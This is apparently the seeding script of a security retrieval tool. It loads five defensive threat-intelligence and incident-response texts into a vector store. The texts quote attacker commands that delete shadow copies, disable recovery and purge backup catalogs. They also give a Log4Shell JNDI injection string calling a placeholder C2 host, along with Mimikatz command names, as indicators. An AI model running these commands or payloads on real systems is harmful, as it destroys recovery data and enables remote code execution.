"""
Seed RAG Knowledge Base with rich CTI documents, MITRE ATT&CK techniques, and incident response playbooks.
"""
import sys
import os

# Add current dir to sys.path
sys.path.insert(0, os.path.abspath(os.path.dirname(__file__)))

from models import CanonicalDocument, SensitivityTier
from ingestion.loader import create_canonical_document
from retrieval.chunker import chunk_document
from retrieval.embedder import Embedder
from retrieval.vector_store import VectorStore
from db.database import save_knowledge_document, get_connection
from domain.audit import audit_service
from ingestion.classifier_service import classify_and_tag_knowledge

CTI_KNOWLEDGE_CORPUS = [
    {
        "title": "LockBit 3.0 & BlackCat Ransomware TTPs and Defense",
        "source_name": "CISA_Advisory_AA23-075A.md",
        "source_type": "cti_report",
        "sensitivity_tier": SensitivityTier.PUBLIC,
        "doc_type": "THREAT_CLASSIFICATION_INTEL",
        "content": """# LockBit 3.0 & BlackCat Ransomware In-Depth Advisory
## Overview & Threat Actor Profile
LockBit 3.0 (also known as LockBit Black) and BlackCat (ALPHV) are sophisticated Ransomware-as-a-Service (RaaS) operations targeting enterprise and healthcare infrastructure.

## Observed Technical Procedures & Indicators
1. **Inhibit System Recovery (MITRE ATT&CK T1490)**:
   - Threat actors execute `vssadmin.exe delete shadows /all /quiet` to invalidate volume shadow copies.
   - Command: `bcdedit /set {default} recoveryenabled No` disables automatic startup repair.
   - Command: `wbadmin delete catalog -quiet` purges Windows Server Backup catalogs.

2. **Defense Evasion & Security Software Termination (T1562.001)**:
   - Adversaries deploy `ProcessHacker` or customized BYOVD (Bring Your Own Vulnerable Driver) rootkits to terminate EDR and antivirus services.

3. **Encryption & Key Exchange**:
   - Hybrid encryption utilizing ChaCha20 / AES-256 for local file encryption and RSA-4096 / Curve25519 for master key encapsulation.
   - File extensions appended: `.lockbit`, `.alphv`, or randomized 9-character hex strings.

## Recommended Containment & Mitigation Playbook
1. Immediately isolate affected endpoints at the network switch/VLAN level to prevent lateral SMB/WMI spread.
2. Terminate active parent process trees (e.g., `cmd.exe`, `powershell.exe`, `vssadmin.exe`).
3. Secure immutable offline backups and verify cryptographic snapshot hashes.
4. Quarantine dropped payloads to protected enclave vaults."""
    },
    {
        "title": "Cobalt Strike & Sliver C2 Stage-1 Beaconing Telemetry",
        "source_name": "Mandiant_M-Trends_C2_Analysis.md",
        "source_type": "cti_report",
        "sensitivity_tier": SensitivityTier.PUBLIC,
        "doc_type": "THREAT_CLASSIFICATION_INTEL",
        "content": """# Cobalt Strike Beacon & In-Memory Payload Analysis
## Executive Summary
Adversaries leverage modular Command and Control (C2) frameworks including Cobalt Strike, Sliver, and Havoc for initial staging and interactive command execution.

## Heuristic & Static Signatures
1. **PE Header Anomalies**:
   - Section headers with non-standard names (`.text2`, `.rsrc_fake`, `.vmp0`, `UPX0`).
   - Shannon entropy exceeding 7.2 in executable code sections indicating packed shellcode.
   - Imports of `VirtualAllocEx`, `WriteProcessMemory`, `CreateRemoteThread`, and `QueueUserAPC` for process injection (T1055).

2. **Network Communications (T1071.001)**:
   - HTTPS beaconing over ports 443, 8000, 8080, and 4444 with randomized jitter (20-30%).
   - Heartbeat intervals transmitting Base64 encoded metadata headers.

## Mitigation & Active Defense
1. Block suspicious external C2 IP addresses at perimeter firewall.
2. Deploy Sigma / YARA rules targeting reflective DLL injection.
3. Isolate host endpoint and extract memory dumps for volatile artifact triage."""
    },
    {
        "title": "PowerShell Obfuscation & Credential Access Playbook",
        "source_name": "SANS_DFIR_SOP_042_PowerShell.md",
        "source_type": "internal_sop",
        "sensitivity_tier": SensitivityTier.INTERNAL,
        "doc_type": "INCIDENT_RESPONSE_PLAYBOOK",
        "content": """# Standard Operating Procedure (SOP-042): Malicious Script Response
## Scope & Purpose
Prescribes response workflows for detecting and neutralizing unauthorized PowerShell, WMI, and script execution across enterprise workstations.

## Triage Procedure
1. **Detecting Obfuscation (T1059.001 / T1027)**:
   - Identify PowerShell commands with `-enc`, `-EncodedCommand`, `[Convert]::FromBase64String`, or XOR decompression routines.
   - Analyze script block logging (Event ID 4104) and transcription logs.

2. **Credential Access Hunting (T1003)**:
   - Inspect processes invoking `Invoke-Mimikatz`, `Sekurlsa::logonpasswords`, or `Get-WmiObject Win32_UserAccount`.
   - Monitor for LSASS memory reading attempts by unsigned binaries.

## Step-by-Step Mitigation Workflow
1. Execute `Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True` to restrict inbound traffic.
2. Invalidate active Kerberos tickets with `klist purge` and rotate compromised domain credentials.
3. Quarantine the suspicious `.ps1` or `.bat` script file into the `.quarantine/` enclave with timestamped audit seals."""
    },
    {
        "title": "Log4j (CVE-2021-44228) & MoveIT (CVE-2023-34362) Ingress Exploitation",
        "source_name": "NVD_CVE_Exploitation_Compendium.md",
        "source_type": "cti_report",
        "sensitivity_tier": SensitivityTier.PUBLIC,
        "doc_type": "CVE_REMEDIATION_GUIDE",
        "content": """# Critical CVE Exploitation & Perimeter Remediation
## CVE-2021-44228 (Log4Shell)
- **CVSS Score**: 10.0 (CRITICAL)
- **Vulnerability**: JNDI lookup injection in Apache Log4j2 versions 2.0-beta9 to 2.14.1.
- **Exploitation Pattern**: Ingress HTTP headers containing `${jndi:ldap://c2-domain.xyz:1389/a}` or `${jndi:rmi://...}` leading to unauthenticated RCE.
- **Remediation**: Upgrade Log4j to >=2.17.1, set `log4j2.formatMsgNoLookups=true`, or remove `JndiLookup.class`.

## CVE-2023-34362 (MOVEit Transfer SQLi & Web Shell)
- **CVSS Score**: 9.8 (CRITICAL)
- **Vulnerability**: Unauthenticated SQL injection leading to remote code execution and LEMURLOOT web shell staging.
- **Indicators**: Creation of `human2.aspx` in `C:\\MOVEitTransfer\\wwwroot\\`.
- **Remediation**: Apply vendor patch immediately, inspect for anomalous database sessions, and block outbound connections to unauthorized IPs."""
    },
    {
        "title": "Host Network Isolation & Forensic Preservation SOP",
        "source_name": "SOC_Playbook_Host_Isolation.md",
        "source_type": "internal_sop",
        "sensitivity_tier": SensitivityTier.INTERNAL,
        "doc_type": "INCIDENT_RESPONSE_PLAYBOOK",
        "content": """# Enterprise Endpoint Isolation & Preservation Playbook
## Protocol Overview
When a host is classified as infected by high-risk Malware, Ransomware, or active C2 beaconing, the analyst must initiate immediate Human-in-the-Loop containment.

## Operational Containment Steps:
1. **Network Link Isolation**:
   - Issue network adapter isolation command disabling non-loopback interface routing.
   - Maintain telemetry connection to RAGSec EDR agent via dedicated secure tunnel.

2. **Process Termination**:
   - Suspend and kill suspicious parent process trees (e.g. `cmd.exe`, `powershell.exe`, `encryptor_demo.exe`).

3. **Volatile Artifact Capture**:
   - Dump process memory and active TCP socket connections to encrypted forensic volume.

4. **Cryptographic Audit Ledger Record**:
   - Record analyst identity, target host ID, timestamp, and SHA-256 signature into the immutable audit trail."""
    }
]

def seed_database():
    print("=== [RAGSec] Seeding RAG Vector Store & Knowledge Base ===")
    embedder = Embedder()
    vector_store = VectorStore()
    
    total_chunks = 0
    
    for item in CTI_KNOWLEDGE_CORPUS:
        print(f"[*] Processing: {item['title']} ({item['source_name']})...")
        
        # 1. Run NLP classification
        classification = classify_and_tag_knowledge(item["content"], item["title"])
        
        # 2. Create canonical document
        doc = create_canonical_document(
            content=item["content"],
            source_name=item["source_name"],
            source_type=item["source_type"],
            title=item["title"],
            sensitivity_tier=item["sensitivity_tier"]
        )
        
        doc_data = doc.model_dump()
        doc_data["doc_type"] = item["doc_type"]
        doc_data["target_categories"] = classification["target_categories"]
        doc_data["primary_category"] = classification["primary_category"]
        doc_data["mitigation_steps"] = classification["mitigation_steps"]
        doc_data["summary"] = classification["summary"]
        doc_data["confidence"] = classification["confidence"]
        doc_data["cves"] = classification["cves"]
        doc_data["ttps"] = classification["ttps"]
        
        # 3. Chunk document
        chunks = chunk_document(doc)
        print(f"    -> Extracted {len(chunks)} canonical chunks")
        
        if chunks:
            mime = "text/markdown"
            save_knowledge_document(doc.document_id, item["source_name"], mime, chunks, doc_data)
            
            # 4. Generate embeddings and upsert to ChromaDB
            texts = [c.text for c in chunks]
            embeddings = embedder.embed_texts(texts)
            vector_store.upsert_chunks(chunks, embeddings)
            total_chunks += len(chunks)
            
        audit_service.log_event("SYSTEM", "INGEST_KNOWLEDGE", item["source_name"], f"Seeded {len(chunks)} chunks [{item['doc_type']}]")
        
    print(f"\n[SUCCESS] Seeded {len(CTI_KNOWLEDGE_CORPUS)} CTI Documents ({total_chunks} Chunks total) into ChromaDB Vector Store!")
    print(f"[STATUS] ChromaDB Vector Store Collection Count: {vector_store.count()} chunks.")

if __name__ == "__main__":
    seed_database()
